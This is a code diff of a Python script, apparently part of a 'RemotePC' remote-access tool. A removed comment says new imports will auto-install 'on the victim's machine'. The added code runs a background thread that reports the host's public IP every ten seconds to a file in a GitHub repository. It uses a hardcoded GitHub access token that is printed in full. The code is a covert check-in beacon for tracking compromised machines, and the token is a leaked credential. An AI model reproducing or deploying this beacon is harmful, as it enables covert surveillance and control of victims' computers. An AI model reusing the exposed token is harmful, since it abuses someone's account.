@@ -1,41 +1,53 @@
-import subprocess
-import sys
-from importlib import util
-def install(package):
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package], stderr=subprocess.DEVNULL)
-        return True
-    except subprocess.CalledProcessError:
-        print(f'[X] Error {package.capitalize()}')
-        return False
-    except Exception as e:
-        print(f'[X] Error {package.capitalize()}. Chi tiết: {e}')
-        return False
-def update_pip():
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], stderr=subprocess.DEVNULL)
-    except subprocess.CalledProcessError as e:
-        print(f'[X] Error update pip: {e}')
-        sys.exit(1)
-def print_install_status(lib, installed):
-    status = '[V] Installed' if installed else '[-] Installing'
-    print(f'{status} {lib.capitalize()}', end='\r')
-def check_and_install_libs(libs):
-    all_installed = True
-    for lib in libs:
-        spec = util.find_spec(lib)
-        if spec is None:
-            print_install_status(lib, False)
-            installed = install(lib)
-            if not installed:
-                all_installed = False
-                continue
-            print_install_status(lib, True)
-    return all_installed
-update_pip()
-libs_to_install = ['requests']
-all_installed = check_and_install_libs(libs_to_install)
-#------------------------------------------------------------------------------------------------------------------------------
-# Khi nào import thư viện khác vào thì nhớ thêm vào dòng 36 để nó tự tải về máy victim··
 import requests
-print(f'{requests.get('https://api.ipify.org/').text} đang Online')
+import time
+import threading
+import base64
+
+def get_file_info(repository, file_path, access_token):
+    api_url = f"https://api.github.com/repos/{repository}/contents/{file_path}"
+    headers = {
+        "Authorization": f"token {access_token}"
+    }
+    response = requests.get(api_url, headers=headers)
+    return response.json()
+def create_file_on_github(repository, file_path, access_token, new_content):
+    file_info = get_file_info(repository, file_path, access_token)
+
+    api_url = f"https://api.github.com/repos/{repository}/contents/{file_path}"
+    headers = {
+        "Authorization": f"token {access_token}"
+    }
+    current_content = base64.b64decode(file_info.get("content", "").encode()).decode().split('\n')
+    current_content.append(new_content)
+    current_content = list(set(current_content))
+    updated_content = '\n'.join(current_content)
+    encoded_content = base64.b64encode(updated_content.encode()).decode()
+    data = {
+        "message": "Update status file",
+        "content": encoded_content,
+        "sha": file_info.get("sha", "")
+    }
+    response = requests.put(api_url, headers=headers, json=data)
+    if response.status_code != 200 and response.status_code != 201:
+        print("Failed to update/create file.")
+        print("Status Code:", response.status_code)
+        print("Response:", response.json())
+def status_online(repository, access_token):
+    file_path = "status.txt"
+    while True:
+        current_status = f'{requests.get("https://api.ipify.org/").text} đang Online'
+        create_file_on_github(repository, file_path, access_token, current_status)
+        time.sleep(10)
+
+def unrelated_task():
+    print('Luồng 2 chạy')
+
+if __name__ == "__main__":
+    repository = "ncdathwb/RemotePC"
+    access_token = "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"
+    online_status_thread = threading.Thread(target=status_online, args=(repository, access_token))
+    online_status_thread.start()
+    unrelated_task_thread = threading.Thread(target=unrelated_task)
+    unrelated_task_thread.start()
+    online_status_thread.join()
+    unrelated_task_thread.join()
